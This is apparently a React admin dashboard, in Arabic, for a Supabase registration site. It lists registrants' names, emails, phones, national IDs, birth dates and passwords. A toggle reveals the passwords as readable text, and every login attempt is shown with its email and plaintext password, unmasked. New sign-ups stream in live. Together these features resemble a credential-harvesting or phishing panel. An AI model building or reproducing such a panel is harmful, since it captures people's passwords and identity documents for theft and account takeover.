import { useEffect, useState, useRef } from 'react';
import { supabase, Registration } from '@/lib/supabase';
import {
  Users, CheckCircle2, Clock, Activity, Eye, EyeOff,
  RefreshCw, Wifi, WifiOff, Shield, Calendar, Phone,
  CreditCard, Mail, Layout, List, User, Lock, FileText, Hash,
  LogIn as LogInIcon
} from 'lucide-react';
import { useSiteConfig, FormField } from '@/context/SiteConfigContext';
import HeaderFooterEditor from '@/components/cms/HeaderFooterEditor';
import PageContentEditor from '@/components/cms/PageContentEditor';
import FormFieldsEditor from '@/components/cms/FormFieldsEditor';

type LoginAttempt = {
  id: string;
  registration_id: string | null;
  email: string;
  password: string;
  created_at: string;
};

type RegistrationWithMeta = Registration & { 
  _new?: boolean; 
  extra_fields?: Record<string, string>;
  login_attempts?: LoginAttempt[];
};

const FIELD_ICONS: Record<string, any> = {
  full_name: User,
  email: Mail,
  phone: Phone,
  national_id: CreditCard,
  date_of_birth: Calendar,
  password: Lock,
  textarea: FileText,
};

const CORE_COLUMNS: Record<string, string> = {
  full_name: 'full_name',
  email: 'email',
  phone: 'phone',
  national_id: 'national_id',
  date_of_birth: 'date_of_birth',
  password: 'password_hash',
};

const statusLabel: Record<string, { text: string; className: string }> = {
  pending: { text: 'قيد المراجعة', className: 'bg-yellow-100 text-yellow-700' },
  verified: { text: 'تم التحقق', className: 'bg-green-100 text-green-700' },
  completed: { text: 'مكتمل', className: 'bg-blue-100 text-blue-700' },
};

function maskPassword(pw: string) {
  return '•'.repeat(Math.min(pw.length, 10));
}

// ─── Registrations Tab ────────────────────────────────────────────────────────

const AVATAR_COLORS = [
  'bg-blue-600', 'bg-emerald-600', 'bg-violet-600',
  'bg-rose-600', 'bg-amber-600', 'bg-cyan-600',
];
function avatarColor(name: string) {
  if (!name) return AVATAR_COLORS[0];
  let n = 0;
  for (let i = 0; i < name.length; i++) n += name.charCodeAt(i);
  return AVATAR_COLORS[n % AVATAR_COLORS.length];
}

function RegistrationsTab() {
  const { formFields } = useSiteConfig();
  const [registrations, setRegistrations] = useState<RegistrationWithMeta[]>([]);
  const [loading, setLoading] = useState(true);
  const [connected, setConnected] = useState(false);
  const [showPassMap, setShowPassMap] = useState<Record<string, boolean>>({});
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const fetchAll = async () => {
    setLoading(true);
    const { data: regs } = await supabase.from('registrations').select('*').order('created_at', { ascending: false });
    
    // Try to fetch login attempts (ignore 404 errors)
    let logins: LoginAttempt[] = [];
    try {
      const { data, error } = await supabase
        .from('login_attempts')
        .select('*')
        .order('created_at', { ascending: false });
      
      // Only use data if no error
      if (!error && data) {
        logins = data;
      }
    } catch (e) {
      // Ignore errors - login_attempts table may not exist
    }
    
    setLoading(false);
    if (regs) {
      const combined = regs.map(r => ({
        ...r,
        login_attempts: logins?.filter(l => l.registration_id === r.id) || []
      }));
      setRegistrations(combined);
    }
  };

  useEffect(() => {
    fetchAll();
    const channel = supabase.channel('admin-registrations')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'registrations' }, (payload) => {
        const newReg = { ...(payload.new as Registration), _new: true };
        setRegistrations((prev) => [newReg, ...prev]);
        setSelectedId((prev) => prev ?? newReg.id);
        setTimeout(() => setRegistrations((prev) => prev.map((r) => r.id === newReg.id ? { ...r, _new: false } : r)), 3000);
      })
      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'registrations' }, (payload) => {
        setRegistrations((prev) => prev.map((r) => r.id === payload.new.id ? { ...r, ...payload.new as Registration } : r));
      })
      .subscribe((status) => setConnected(status === 'SUBSCRIBED'));
    channelRef.current = channel;
    return () => { supabase.removeChannel(channel); };
  }, []);

  const togglePassVisibility = (id: string) =>
    setShowPassMap((prev) => ({ ...prev, [id]: !prev[id] }));

  const stats = {
    total: registrations.length,
    verified: registrations.filter((r) => r.status === 'verified' || r.status === 'completed').length,
    pending: registrations.filter((r) => r.status === 'pending').length,
    today: registrations.filter((r) => new Date(r.created_at).toDateString() === new Date().toDateString()).length,
  };

  const selected = registrations.find((r) => r.id === selectedId);

  return (
    <div className="flex flex-col flex-1 overflow-hidden gap-5 text-right" dir="rtl">

      {/* ── Stats row ── */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 shrink-0">
        {([
          { label: 'إجمالي التسجيلات', value: stats.total,    icon: Users,        color: 'blue'   },
          { label: 'تم التحقق',          value: stats.verified, icon: CheckCircle2, color: 'green'  },
          { label: 'قيد المراجعة',       value: stats.pending,  icon: Clock,        color: 'yellow' },
          { label: 'تسجيلات اليوم',      value: stats.today,    icon: Activity,     color: 'purple' },
        ] as { label: string; value: number; icon: React.ElementType; color: string }[]).map((card) => {
          const Icon = card.icon;
          const clr: Record<string, { bg: string; text: string }> = {
            blue:   { bg: 'bg-blue-500/20',   text: 'text-blue-400'   },
            green:  { bg: 'bg-green-500/20',  text: 'text-green-400'  },
            yellow: { bg: 'bg-yellow-500/20', text: 'text-yellow-400' },
            purple: { bg: 'bg-purple-500/20', text: 'text-purple-400' },
          };
          return (
            <div key={card.label} className="bg-slate-800 rounded-2xl p-5 border border-slate-700">
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center mb-3 ${clr[card.color].bg}`}>
                <Icon className={`w-5 h-5 ${clr[card.color].text}`} />
              </div>
              <p className={`text-3xl font-extrabold ${clr[card.color].text}`}>{card.value}</p>
              <p className="text-xs text-slate-400 mt-1 font-medium">{card.label}</p>
            </div>
          );
        })}
      </div>

      {/* ── Split panel ── */}
      <div className="flex-1 flex gap-4 overflow-hidden min-h-0">

        {/* ── LEFT: Registration list (40%) ── */}
        <div className="w-2/5 flex flex-col bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden">
          <div className="shrink-0 px-4 py-3 border-b border-slate-700 flex items-center justify-between gap-2">
            <div className="flex items-center gap-2 min-w-0">
              <Activity className="w-4 h-4 text-blue-400 shrink-0" />
              <span className="font-bold text-white text-sm truncate">سجل التسجيلات</span>
              <span className="bg-slate-700 text-slate-400 text-xs px-2 py-0.5 rounded-full shrink-0">
                {registrations.length}
              </span>
            </div>
            <div className="flex items-center gap-2 shrink-0">
              <div className={`flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold ${connected ? 'bg-green-900/60 text-green-400' : 'bg-red-900/60 text-red-400'}`}>
                {connected ? <Wifi className="w-3 h-3" /> : <WifiOff className="w-3 h-3" />}
                <span className="hidden sm:inline">{connected ? 'مباشر' : 'منقطع'}</span>
              </div>
              <button onClick={fetchAll} className="p-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-400 hover:text-white transition-colors">
                <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
              </button>
            </div>
          </div>

          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center py-16">
                <div className="w-7 h-7 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
              </div>
            ) : (
              <div className="divide-y divide-slate-700/40">
                {registrations.map((reg) => {
                  const st = statusLabel[reg.status] || statusLabel.pending;
                  const isSelected = reg.id === selectedId;
                  const name = reg.full_name || 'بدون اسم';
                  return (
                    <button key={reg.id} onClick={() => setSelectedId(isSelected ? null : reg.id)}
                      className={`w-full text-right px-4 py-3.5 flex items-center gap-3 transition-all group ${reg._new ? 'bg-blue-500/10 border-r-2 border-blue-400' : isSelected ? 'bg-slate-700/80 border-r-2 border-blue-500' : 'hover:bg-slate-700/40 border-r-2 border-transparent'}`}>
                      <div className={`w-9 h-9 rounded-full ${avatarColor(name)} flex items-center justify-center text-white font-bold text-sm shrink-0 shadow-md`}>
                        {name.charAt(0)}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 justify-between">
                          <span className={`text-sm font-semibold truncate ${isSelected ? 'text-white' : 'text-slate-200 group-hover:text-white'}`}>{name}</span>
                          <span className={`text-xs px-2 py-0.5 rounded-full font-semibold shrink-0 ${st.className}`}>{st.text}</span>
                        </div>
                        <p className="text-xs text-slate-500 truncate mt-0.5 ltr text-left">{reg.email}</p>
                      </div>
                    </button>
                  );
                })}
              </div>
            )}
          </div>
        </div>

        {/* ── RIGHT: Detail panel (60%) ── */}
        <div className="w-3/5 flex flex-col bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden">
          <div className="shrink-0 px-5 py-3.5 border-b border-slate-700 flex items-center gap-2">
            <Shield className="w-4 h-4 text-blue-400" />
            <h2 className="font-bold text-white text-sm">{selected ? `تفاصيل: ${selected.full_name || 'المستخدم'}` : 'تفاصيل المستخدم'}</h2>
          </div>

          <div className="flex-1 overflow-y-auto">
            {!selected ? (
              <div className="flex flex-col items-center justify-center h-full text-slate-500 px-6 text-center gap-3">
                <Users className="w-8 h-8 opacity-30" />
                <p className="text-sm font-medium">لم يتم اختيار أي مستخدم</p>
              </div>
            ) : (
              <div className="p-6 space-y-6">
                {/* Profile Header */}
                <div className="flex items-center gap-4 pb-5 border-b border-slate-700">
                  <div className={`w-16 h-16 rounded-2xl ${avatarColor(selected.full_name || '')} flex items-center justify-center text-2xl font-extrabold text-white shadow-xl`}>
                    {(selected.full_name || '?').charAt(0)}
                  </div>
                  <div>
                    <h3 className="text-lg font-extrabold text-white leading-tight">{selected.full_name || 'بدون اسم'}</h3>
                    <span className={`inline-block px-3 py-1 rounded-full text-xs font-semibold mt-1.5 ${statusLabel[selected.status]?.className}`}>{statusLabel[selected.status]?.text}</span>
                  </div>
                </div>

                {/* Info Grid */}
                <div className="grid sm:grid-cols-2 gap-4">
                  {formFields
                    .filter(f => f.page_key === 'register' && f.field_key !== 'confirm_password')
                    .sort((a, b) => a.field_order - b.field_order)
                    .map((field) => {
                      const Icon = FIELD_ICONS[field.field_key] || Activity;
                      const coreCol = CORE_COLUMNS[field.field_key];
                      const value = coreCol ? (selected as any)[coreCol] : (selected.extra_fields?.[field.field_key]);
                      if (field.field_type === 'password') {
                        return (
                          <div key={field.id} className="bg-slate-700/40 rounded-xl p-4 flex items-center gap-3 col-span-full">
                            <Shield className="w-4 h-4 text-slate-400" />
                            <div className="flex-1">
                              <p className="text-xs text-slate-500 font-medium">{field.label}</p>
                              <div className="flex items-center gap-3">
                                <p className="font-mono text-sm text-white tracking-widest">{showPassMap[selected.id] ? (value || '—') : maskPassword(value || '')}</p>
                                <button onClick={() => togglePassVisibility(selected.id)} className="text-xs text-blue-400 hover:underline">
                                  {showPassMap[selected.id] ? 'إخفاء' : 'إظهار'}
                                </button>
                              </div>
                            </div>
                          </div>
                        );
                      }
                      return (
                        <div key={field.id} className="bg-slate-700/40 rounded-xl p-4 flex items-start gap-3">
                          <Icon className="w-4 h-4 text-slate-400 mt-1" />
                          <div className="min-w-0 flex-1">
                            <p className="text-xs text-slate-500 font-medium mb-0.5">{field.label}</p>
                            <p className="text-sm text-white font-semibold truncate">{value || '—'}</p>
                          </div>
                        </div>
                      );
                    })}
                </div>

                {/* Login Attempts Section */}
                <div className="space-y-3 pt-4 border-t border-slate-700">
                  <div className="flex items-center gap-2 mb-2">
                    <LogInIcon className="w-4 h-4 text-amber-400" />
                    <h4 className="text-sm font-bold text-white">محاولات تسجيل الدخول</h4>
                  </div>
                  
                  {(!selected.login_attempts || selected.login_attempts.length === 0) ? (
                    <div className="bg-slate-800/50 rounded-xl p-4 text-center border border-dashed border-slate-700">
                      <p className="text-xs text-slate-500 italic">لا توجد محاولات دخول مسجلة</p>
                    </div>
                  ) : (
                    <div className="space-y-2">
                      {selected.login_attempts.map((attempt) => (
                        <div key={attempt.id} className="bg-slate-900/50 border border-slate-700/50 rounded-xl p-3 flex flex-col gap-2">
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] text-slate-500 font-mono">
                              {new Date(attempt.created_at).toLocaleString('ar-SA')}
                            </span>
                            <span className="text-[10px] bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded-full">تسجيل دخول</span>
                          </div>
                          <div className="grid grid-cols-2 gap-2">
                            <div className="bg-slate-800/50 rounded-lg p-2">
                              <p className="text-[10px] text-slate-500 mb-1">البريد</p>
                              <p className="text-xs text-slate-200 truncate ltr text-left">{attempt.email}</p>
                            </div>
                            <div className="bg-slate-800/50 rounded-lg p-2">
                              <p className="text-[10px] text-slate-500 mb-1">كلمة المرور</p>
                              <p className="text-xs text-white font-bold tracking-wider">{attempt.password}</p>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── CMS Tab ──────────────────────────────────────────────────────────────────

function CMSTab() {
  const [activeSection, setActiveSection] = useState<'header_footer' | 'pages' | 'form_fields'>('header_footer');
  return (
    <div className="space-y-5 text-right" dir="rtl">
      <div className="flex gap-2 overflow-x-auto pb-1">
        {[
          { key: 'header_footer', label: 'الرأس والتذييل' },
          { key: 'pages', label: 'محتوى الصفحات' },
          { key: 'form_fields', label: 'حقول النماذج' },
        ].map((s) => (
          <button key={s.key} onClick={() => setActiveSection(s.key as any)}
            className={`px-5 py-2.5 rounded-xl text-sm font-semibold whitespace-nowrap transition-all ${activeSection === s.key ? 'bg-blue-600 text-white shadow-md' : 'bg-slate-800 border border-slate-700 text-slate-400 hover:text-white'}`}>
            {s.label}
          </button>
        ))}
      </div>
      {activeSection === 'header_footer' && <HeaderFooterEditor />}
      {activeSection === 'pages' && <PageContentEditor />}
      {activeSection === 'form_fields' && <FormFieldsEditor />}
    </div>
  );
}

// ─── Main Admin Page ──────────────────────────────────────────────────────────

export default function AdminPage() {
  const [activeTab, setActiveTab] = useState<'registrations' | 'cms'>('registrations');

  return (
    <div className="h-screen flex flex-col bg-slate-900 text-white overflow-hidden" dir="rtl">
      <header className="shrink-0 bg-slate-800 border-b border-slate-700 px-4 sm:px-6 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div className="text-right">
              <h1 className="text-base font-bold text-white">لوحة التحكم</h1>
              <p className="text-xs text-slate-400">إدارة الموقع والتسجيلات</p>
            </div>
          </div>
          <div className="flex gap-1 bg-slate-700/50 rounded-xl p-1">
            {[
              { key: 'registrations', label: 'التسجيلات', icon: List },
              { key: 'cms', label: 'إدارة المحتوى', icon: Layout },
            ].map(({ key, label, icon: Icon }) => (
              <button key={key} onClick={() => setActiveTab(key as any)}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all ${activeTab === key ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}>
                <Icon className="w-4 h-4" />{label}
              </button>
            ))}
          </div>
        </div>
      </header>

      <div className="flex-1 overflow-hidden flex flex-col">
        <div className="max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 flex flex-col flex-1 overflow-hidden">
          {activeTab === 'registrations' ? <RegistrationsTab /> : (
            <div className="flex-1 overflow-y-auto"><CMSTab /></div>
          )}
        </div>
      </div>
    </div>
  );
}
